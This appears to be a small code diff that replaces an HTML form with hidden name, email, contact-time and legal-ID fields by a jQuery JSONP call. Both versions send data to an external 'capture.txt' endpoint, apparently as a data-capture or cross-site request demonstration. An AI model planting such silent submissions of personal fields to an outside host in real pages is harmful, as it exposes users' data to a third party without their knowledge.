@@ -1,15 +1,9 @@
-    <html>
-       <body>
-       <form action ='http://allthept.com/capture.txt' method ='POST' >
-        <input type ='hidden' value ='official' name = 'name'/>
-          <input type ='hidden' value ='official2' name = 'email'/>
-          <input type ='hidden' value ='official3' name = 'contactTime'/>
-          <label for 'other info'> Enter details here </label> <br/>
-      <textarea rows='4' cols='50' name ='other info' maxlength='200'></textarea>
-
-       <input type ='hidden' value ='official4' name = 'legalId'/> 
-     </br>
-      <input type = 'submit' name = 'submit' value ='Send'/>
-  </form>
-  </body>
- </html>
+$.ajax({
+  dataType: 'jsonp',
+  data: 'id=10',
+  jsonp: 'jsonp_callback',
+  url: 'http://allthept.com/capture.txt',
+  success: function () {
+    // do stuff
+  },
+});
